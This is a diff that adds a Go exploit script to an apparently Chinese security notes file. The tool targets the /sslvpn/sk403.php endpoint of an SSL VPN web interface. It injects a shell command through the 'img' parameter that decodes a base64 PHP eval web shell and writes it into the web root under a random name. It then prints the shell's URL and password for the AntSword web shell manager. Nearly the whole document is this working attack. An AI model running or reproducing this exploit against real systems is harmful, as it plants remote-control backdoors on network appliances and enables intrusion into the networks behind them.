@@ -385,3 +385,102 @@ func init() {
 	))
 }
 ```
+
+## 另外一个点
+```
+package main
+
+import (
+        "crypto/tls"
+        "fmt"
+        "github.com/fatih/color"
+        "github.com/hpifu/go-kit/hflag"
+        "github.com/imroc/req/v3"
+        "github.com/liushuochen/gotable"
+        "github.com/liushuochen/gotable/table"
+        "github.com/thanhpk/randstr"
+        "net/http"
+        "os"
+        "strings"
+        "time"
+)
+
+func main() {
+        now := time.Now()
+        host, addr := getUserParams()
+        exploit(host, addr)
+        fmt.Println(color.GreenString("Total Use Time : %s\n", time.Since(now).String()))
+}
+func httpReqClient() *req.Client {
+        var reqHeader = map[string]string{
+                "User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+                "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept-Language": "zh-CN,zh-TW;q=0.9,zh;q=0.8",
+                "Connection":      "close",
+        }
+        cli := req.C()
+        for reqHeaderName, reqHeaderValue := range reqHeader {
+                cli.SetCommonHeader(reqHeaderName, reqHeaderValue)
+        }
+        cli.EnableForceHTTP1()
+        cli.SetTLSFingerprintSafari()
+        cli.SetTimeout(time.Second * 15)
+        cli.SetRedirectPolicy(req.NoRedirectPolicy())
+        cli.SetAutoDecodeAllContentType()
+        cli.TLSClientConfig = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS13}
+        return cli
+}
+
+func getUserParams() (host, proxyAddr string) {
+        hflag.AddFlag("target", "目标地址", hflag.Required(), hflag.Shorthand("t"))
+        hflag.AddFlag("proxy", "代理地址", hflag.Shorthand("p"))
+        if err := hflag.Parse(); err != nil {
+                fmt.Println(color.RedString("%s", hflag.Usage()))
+                os.Exit(1)
+        }
+        target := hflag.GetString("target")
+        proxyString := hflag.GetString("proxy")
+        return target, proxyString
+}
+
+func randFile() string {
+        filename := randstr.Hex(8)
+        return filename
+}
+func fmtTable() *table.Table {
+        tab, _ := gotable.Create(color.GreenString("%s", "Shell连接工具"), color.RedString("%s", "Shell连接地址"), color.BlueString("%s", "Shell连接密码"))
+        return tab
+}
+
+func exploit(t, p string) {
+        filename := randFile() + ".php"
+        vulPath := "/sslvpn/sk403.php?client=logoImg&img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/" + filename
+        fullURL := strings.Replace(t+vulPath, "//ss", "/ss", 1)
+        client := httpReqClient()
+        if p != "" {
+                client.SetProxyURL(p)
+        }
+        get, err := client.R().Get(fullURL)
+        if err != nil {
+                fmt.Println(err)
+        }
+        defer func() {
+                _ = get.Body.Close()
+        }()
+        ShellURL := strings.Replace(t+"/sslvpn/"+filename, "//ss", "/ss", 1)
+        if get.StatusCode == http.StatusOK {
+                if strings.Contains(get.String(), "/usr/local/webui/sslvpn/") {
+                        t2 := fmtTable()
+                        _ = t2.AddRow([]string{
+                                "AntSword", ShellURL, "c",
+                        })
+                        fmt.Println(t2)
+                        return
+                }
+        } else {
+                fmt.Println(color.RedString("%s", "站点不存在漏洞,安全的很"))
+                return
+        }
+}
+```
